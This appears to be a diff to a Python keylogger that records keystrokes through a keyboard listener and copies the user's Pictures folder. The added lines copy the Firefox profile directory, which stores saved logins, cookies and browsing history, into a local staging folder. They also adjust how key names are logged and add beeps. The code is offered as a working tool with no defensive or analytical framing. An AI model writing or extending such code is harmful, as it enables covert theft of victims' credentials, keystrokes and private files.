@@ -32,6 +32,9 @@ totЯ= os.path.expanduser("~")
 manfuckthisshit=os.path.join(totЯ, "Pictures")
 adrian=f"./user-files/image"
 
+diddyahh= os.path.expanduser("~")
+explainourfriend=os.path.join(diddyahh, "AppData\Roaming\Mozilla\Firefox\Profiles")
+myahh=f"./user-files/firefox"
 #                                   _________  ________  ________  _____ ______   ________  ________  _____ ______                                        
 #                                  |\___   ___\\   __  \|\   __  \|\   _ \  _   \|\   __  \|\   ____\|\   _ \  _   \                                      
 #                                  \|___ \  \_\ \  \|\  \ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \___|\ \  \\\__\ \  \                                     
@@ -152,9 +155,12 @@ def on_press(key):
          thedamnlist.append("'windowsKEY',")
       elif key == Key.esc:
          thedamnlist.append('"---[exiting ahh]---"')
+      elif "Key." in key:
+          thedamnlist.append('`{0}`,'.format(str(key)[4:]))
       else :
        thedamnlist.append('`{0}`,'.format(str(key)))
-        
+      
+         
 
 def on_release(key):
     if key == keyboard.Key.esc:
@@ -192,9 +198,20 @@ else:
 trBLOCK= time.time()
 try : 
    shutil.copytree(manfuckthisshit,adrian)
+   win32api.Beep(100,67)
+
    adrianValue=True
 except :
    adrianValue=False
+   win32api.Beep(1000,670)
+
+try : 
+   win32api.Beep(100,67)
+   shutil.copytree(explainourfriend,myahh)
+   fuhfuh=True
+except :
+   win32api.Beep(1000,670)
+   fuhfuh=False
 
 with open(filepath, "w") as fucker:
     fucker.write("const $fr = [")
